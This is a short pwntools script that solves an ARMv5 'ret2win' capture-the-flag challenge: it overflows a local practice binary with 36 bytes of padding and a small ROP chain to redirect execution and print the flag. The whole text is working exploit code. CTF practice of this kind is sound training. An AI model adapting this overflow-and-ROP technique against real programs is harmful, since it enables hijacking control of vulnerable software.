from pwn import *

BINARY = "./ret2win_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

rop = b"A"*36
rop += p64(0x0001050c) # pop {r4, pc}
rop += p32(ELF.symbols["ret2win"])

log.success(f"ROP chain : {rop}")

p.recv()
p.sendline(rop)
flag = p.recv().split(b'\n')
log.success(f"FLAG : {flag}")
